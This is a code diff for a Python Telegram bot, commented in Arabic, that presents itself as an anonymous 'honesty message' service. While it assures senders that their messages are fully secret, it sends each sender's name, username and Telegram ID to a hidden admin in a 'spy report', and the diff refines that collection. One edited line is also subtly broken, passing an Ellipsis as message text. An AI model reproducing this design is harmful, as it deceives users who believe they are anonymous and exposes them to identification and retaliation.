@@ -13,7 +13,7 @@ ADMIN_ID = 8820368378
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# قاعدة بيانات مؤقتة في الذاكرة لتخزين الحظر والرسائل والحالات لكل الناس
+# قاعدة بيانات مؤفتة في الذاكرة لتخزين الحظر والرسائل والحالات لكل الناس
 users_db = {}      
 messages_db = {}   
 user_states = {}   # لتخزين الشخص اللي بنرسل له {sender_id: target_id}
@@ -65,7 +65,7 @@ def send_welcome(message):
     welcome_text = (
         "👋 أهلاً بك في بوت الصراحة والرسائل المجهولة!\n\n"
         f"🔗 الرابط الخاص بك لاستقبال الرسائل هو:\n`{share_link}`\n\n"
-        "انشره in حساباتك لتبدأ في استقبال رسائل مجهولة وسرية من أصدقائك."
+        "انشره في حساباتك لتبدأ في استقبال رسائل مجهولة وسرية من أصدقائك."
     )
     # ميزة إضافية لكِ إذا فتحتِ البوت تشوفي لوحة ترحيب خاصة
     if user_id == ADMIN_ID:
@@ -94,8 +94,8 @@ def handle_anonymous_routing(message):
     msg_counter += 1
     messages_db[msg_counter] = sender_id
 
-    # معلومات المُرسِل التفصيلية والسرية
-    first_name = message.from_user.first_name
+    # جلب معلومات المُرسِل الحقيقية من التحديث الحالي للرسالة مباشرة
+    first_name = message.from_user.first_name if message.from_user.first_name else "لا يوجد اسم"
     username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد معرف"
     
     # 📝 1. الرسالة التي ستصل لصاحب الرابط الأصلي (بدون أي معلومات عن المرسل!)
@@ -105,7 +105,7 @@ def handle_anonymous_routing(message):
         f"⏳ _تم إرسالها بهوية مجهولة تماماً._"
     )
 
-    # 🕵️‍♀️ 2. التقرير السري والحصري الذي سيطير لكِ أنتِ فقط على حسابك!
+    # 🕵️‍♀️ 2. التقرير السري والحصري الذي سيطير لكِ أنتِ فقط على حسابك! (تم تعديل جلب البيانات هنا)
     spy_report_for_admin = (
         f"👁‍🗨 **[تقرير إشرافي] رسالة صراحة متداولة في البوت!**\n\n"
         f"👤 **المُرسِل:** {first_name} ({username}) [ID: `{sender_id}`]\n"
@@ -130,13 +130,13 @@ def handle_anonymous_routing(message):
             bot.send_message(chat_id=ADMIN_ID, text=spy_report_for_admin, reply_markup=markup, parse_mode="Markdown")
         
         # طمأنة المرسِل في شاته وإبقاء الجلسة مفتوحة للإرسال المتتالي
-        bot.send_message(chat_id=sender_id, text="✅ تم إرسال رسالتك بنجاح وبسرية تامة! (يمكنك إرسال رسالة أخرى مباشرة)")
+        bot.send_message(chat_id=sender_id, text=... if message.text == "" else "✅ تم إرسال رسالتك بنجاح وبسرية تامة! (يمكنك إرسال رسالة أخرى مباشرة)")
     except Exception as e:
         bot.send_message(chat_id=sender_id, text="❌ فشل إرسال الرسالة.")
         if sender_id in user_states:
             del user_states[sender_id]
     
-    # تم إزالة سطر del user_states لضمان استمرار خاصية الإرسال المتتالي ورا بعض بدون تكرار دخول الرابط!
+    # تم إزالة سطر del user_states لضمان استمرار خاصية الإرسال المتتالي
 
 # زر الحظر التفاعلي الخاص بكِ أنتِ فقط لإلغاء وتفعيل الحظر بضغطة زر
 @bot.callback_query_handler(func=lambda call: call.data.startswith('masterblock_'))
@@ -188,5 +188,5 @@ if __name__ == "__main__":
         pass
         
     threading.Thread(target=run_dummy_server, daemon=True).start()
-    print("🕵️‍♀️ البوت يعمل الآن بكافة ميزاتك الأصلية مع زر الحظر التفاعلي...")
+    print("🕵️‍♀️ البوت يعمل الآن بكافة ميزاتك الأصلية مع زر الحظر ومعلومات الرادار الحية...")
     bot.infinity_polling()
